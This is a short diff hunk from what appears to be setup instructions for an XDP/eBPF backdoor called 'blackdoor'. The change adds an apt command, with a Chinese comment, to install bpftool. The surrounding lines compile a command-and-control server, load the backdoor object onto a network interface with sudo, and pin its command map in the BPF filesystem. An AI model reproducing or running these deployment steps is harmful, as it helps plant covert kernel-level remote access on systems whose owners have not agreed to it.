@@ -20,6 +20,9 @@ gcc c2_server.c -o c2_server -pthread
 # Load into kernel
 sudo ip link set dev eth0 xdp obj xdp_blackdoor.o sec xdp
 
+# 安装bpftool
+apt install -y linux-tools-$(uname -r) linux-tools-common
+
 # Pin the map to filesystem
 sudo bpftool map pin name commands /sys/fs/bpf/blackdoor_commands
 
